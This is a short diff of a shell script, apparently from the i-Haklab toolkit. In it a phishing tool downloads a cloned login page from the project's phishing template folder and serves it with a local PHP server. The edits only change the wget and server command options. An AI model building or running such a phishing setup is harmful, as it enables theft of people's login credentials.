@@ -29,7 +29,7 @@ Doindex() {
 
 Clone() {
         printf "$G\n[+]->$W Site $SITE cloned"
-wget https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/phishing/$SITE -O $TMP_PATH/login.html > /dev/null 2>&1
+wget -q https://raw.githubusercontent.com/ivam3/i-Haklab/master/.set/phishing/$SITE -O $TMP_PATH/login.html
 }
 
 Doip-php() {
@@ -83,7 +83,7 @@ Server() {
 		killall -2 php > /dev/null 2>&1
         fi
         ########## RUNNING SERVER #################
-        exec serverphp $TMP_PATH > /dev/null 2>&1 &
+        exec serverphp 4546 IO $TMP_PATH > /dev/null 2>&1 &
         ###########################################
 }
 
